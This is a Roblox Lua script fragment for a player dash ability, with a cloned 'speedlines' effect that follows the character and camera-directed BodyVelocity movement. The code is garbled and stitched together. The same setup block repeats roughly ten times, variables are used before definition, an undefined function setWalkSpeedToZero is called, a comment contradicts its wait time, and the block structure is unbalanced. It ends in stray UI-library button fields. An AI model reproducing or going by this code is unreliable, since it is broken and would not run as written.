-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)



-- Function to initiate rush effect
local function initiateRush()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        return
    end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

    -- Set rush speed and force
    local rushSpeed = 187
    local maxForce = Vector3.new(100000, 0, 100000)  -- Adjust max force as needed

    -- Get initial rush direction based on camera's look vector
    local camera = game.Workspace.CurrentCamera
    local initialLookVector = camera.CFrame.LookVector
    local rushDirection = Vector3.new(initialLookVector.X, 0, initialLookVector.Z).unit  -- Ignore Y direction

    -- Create BodyVelocity to apply rush force
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = rushDirection * rushSpeed
    bodyVelocity.MaxForce = maxForce
    bodyVelocity.P = 10000  -- Adjust P value for smoother movement
    bodyVelocity.Parent = character:WaitForChild("HumanoidRootPart")

    -- Function to update rush direction based on camera look vector
    local function updateRushDirection()
        rushDirection = camera.CFrame.LookVector
        rushDirection = Vector3.new(rushDirection.X, 0, rushDirection.Z).unit  -- Ignore Y direction
        bodyVelocity.Velocity = rushDirection * rushSpeed
    end

    -- Connect to RenderStepped to continuously update rush direction
    local connection
    connection = game:GetService("RunService").RenderStepped:Connect(function()
        updateRushDirection()
    end)

    -- Function to stop rush effect and clean up after 4.15 seconds
    local function stopRushEffect()
        bodyVelocity:Destroy()
        connection:Disconnect()
    end

    -- Stop the rush effect after 4.15 seconds
    wait(4.21)
    stopRushEffect()

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "speedlines" then
        -- Delete the part
        child:Destroy()
    end
end

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "speedlinesandstuff" then
        -- Delete the part
        child:Destroy()
    end
end

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "thespeedthingunderultik" then
        -- Delete the part
        child:Destroy()
    end
end

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function setWalkSpeedToSixTeen()
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 16
end

if character then
    setWalkSpeedToZero()
end

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    setWalkSpeedToZero()
end)


end

-- Example usage: Call initiateRush() when you want to trigger the rush effect.
initiateRush()
end


-- Add functionality to the tool when activated
tool.Equipped:Connect(function()
    activateTool()
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
